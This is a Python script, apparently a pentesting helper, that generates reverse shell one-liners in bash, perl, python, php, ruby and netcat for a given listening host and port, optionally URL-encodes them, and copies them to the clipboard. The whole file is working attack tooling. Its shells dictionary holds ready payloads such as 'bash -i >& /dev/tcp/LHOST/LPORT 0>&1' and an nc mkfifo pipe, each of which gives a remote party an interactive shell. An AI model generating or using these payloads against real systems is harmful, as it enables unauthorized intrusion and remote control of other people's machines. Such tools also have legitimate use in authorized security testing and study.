import argparse
import urllib.parse
import sys
import pyperclip

def url_encode(shell):
    return (urllib.parse.quote(shell,safe=''))

def craft_shell(type):
    n=0
    for rev in type:
        print(n,"=>",rev)
        n+=1
    opt=int(input("Choose: "))
    try:
        rshell = type[opt].replace("LHOST",lhost).replace("LPORT",lport)
        if encode:
            pyperclip.copy(url_encode(rshell))
        else:
            pyperclip.copy(rshell)
        print("[!] Reverse shell copied to clipboard")
    except:
        print("Unknown error, exiting...")
        exit(0)
    

parser = argparse.ArgumentParser(usage=f"python {sys.argv[0]} -sh <typeofshell> -lh <lhost> -lp <lport>* -enc <URLencode>*")
parser.add_argument("-sh","--shell",metavar="",required=True,help="Type of rshell: | BASH | PERL | PYTHON | PHP | RUBY | NETCAT |")
parser.add_argument("-lh","--lhost",metavar="",required=True,help="Listening host <ip>") 
parser.add_argument("-lp","--lport",metavar="",required=False,help="Listening port <int>")
parser.add_argument("-enc","--encode",required=False,action='store_true',help="Url encode, default: false")
args = parser.parse_args()

shell = args.shell.lower()
lhost = args.lhost
lport = args.lport if args.lport else '4444'
encode = args.encode

shells = {
    'bash':['bash -i >& /dev/tcp/LHOST/LPORT 0>&1','0<&196;exec 196<>/dev/tcp/LHOST/LPORT; sh <&196 >&196 2>&196','sh -i >& /dev/udp/LHOST/LPORT 0>&1'],
    'perl':['perl -e "use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};"','perl -MIO -e "$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"LHOST:LPORT");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;"'],
    'python':['python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);"','python -c "import os; os.system("nc -e /bin/sh LHOST LPORT")"'],
    'php':['php -r "$sock=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");"'],
    'ruby':['ruby -rsocket -e"f=TCPSocket.open("LHOST",LPORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)"'],
    'netcat':['netcat -e /bin/sh LHOST LPORT','rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f']
}
try:
    craft_shell(shells[shell])
except:
    print("Available types of shells: | BASH | PERL | PYTHON | PHP | RUBY | NETCAT |")
